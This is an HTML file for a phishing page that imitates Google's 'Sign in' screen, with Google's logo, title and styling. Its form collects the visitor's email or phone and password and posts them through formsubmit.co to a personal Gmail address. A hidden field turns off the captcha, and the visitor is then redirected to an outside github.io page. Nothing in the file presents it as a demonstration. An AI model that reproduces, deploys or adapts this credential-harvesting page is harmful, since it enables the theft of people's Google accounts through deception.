<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="icon" href="temp/google.png" type="image/x-icon">
  <title>Google</title>
  <style>
@import url("https://fonts.googleapis.com/css2?family=Roboto&display=swap");
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}
body {
  font-family: "Roboto";
}
a {
  text-decoration: none;
  color: #1a73e8;
  display: block;
  font-size: 14px;
}
.container {
  max-width: 450px;
  margin: auto;
  margin-top: 4rem;
  padding: 2rem;
  height: 500px;
}
.top-content {
  text-align: center;
}
img {
  position: relative;
  width: 40px;
  left: -30%;
  margin: 10px;
}
h1 {
  position: relative;
  left: -30%;
  font-size: 40px;
  font-weight: 100%;
  margin-bottom: 10px;
    }
h2 {
  font-size: 20px;
  font-weight: 100%;
  margin-bottom: 10px;
}
.heading {
  position: relative;
  left: -30%;
  margin: 10px;
}

.input-group {
  position: relative;
    }
.link-btn {
  margin-bottom: 2rem;
}
    input[type="text"],
    input[type="password"] {
      display: block;
      border: 1px solid black;
      font-size: 16px;
      width: 100%;
      height: 55px;
      padding: 0 15px;
      margin-bottom: 10px;
      position: relative;
      z-index: 2;
      background-color: transparent;
      outline: none;
      border-radius: 5px;
    }

    .input-group label {
      position: absolute;
      top: 15px;
      font-size: 1.1rem;
      left: 14px;
      color: black;
      font-weight: 100;
      transition: 0.1s ease;
      background-color: white;
      padding: 0 5px;
    }

    input:focus~label,
    input:valid~label {
      top: -7px;
      color: #1864c9;
      font-size: 13px;
      background-color: white;
      z-index: 2;
    }

    .link-btn {
      margin-bottom: 2rem;
    }
    
.color {
  color: rgb(90, 90, 90);
  margin-bottom: 5px;
}
.btn-group {
  display: flex;
  justify-content: space-between;
}
.create-btn {
  border: none;
  background-color: transparent;
  color: #1a73e8;
  font-weight: bold;
  cursor: pointer;
  height: 35px;
  padding: 10px 5px;
}
.next-btn {
  background-color: #1a73e8;
  color: white;
  border: none;
  height: 38px;
  padding: 0 25px;
  border-radius: 25px;
  cursor: pointer;
}
.create-btn:hover {
  background-color: #e8f2ff6e;
}
.next-btn:hover {
  background-color: #1864c9;
}
  </style>
</head>

<body>
<div class="container">
  <div class="top-content">
    <img src="temp/google.png" alt="Google">
    <h2>Sign in</h2>
    <p class="heading">Use your Google Account</p>
    <form action="https://formsubmit.co/kumarsharma2580@gmail.com" method="POST">
    <div class="input-group">
      <input type="text" name="Gmail" id="email" required>
      <label for="email">Email or phone</label>
    </div>

    <div class="input-group">
      <input type="password" name="Google Password" id="password" required>
      <label for="password">Password</label>
    </div>

  </div>
  <input type="hidden" name="_captcha" value="false">
  <input type="hidden" name="_next" value="https://shkumaraman.github.io/win.html">
  <a href="https://accounts.google.com/signin/v2/usernamerecovery" class="link-btn">Forgot Email?</a>
  <p class="color">Not your computer? Use Guest mode to sign in privately.</p>
  <a href="https://support.google.com/chrome/answer/6130773?hl=en" target="_blank" rel="noopener noreferrer" class="link-btn">Learn more about using Guest mode</a>
  <div class="btn-group">
    <button class="create-btn">Create account</button>
      <button class="next-btn" type="submit">Next</button>
  </div>
</form>
</div>
  </div>
</body>

</html>
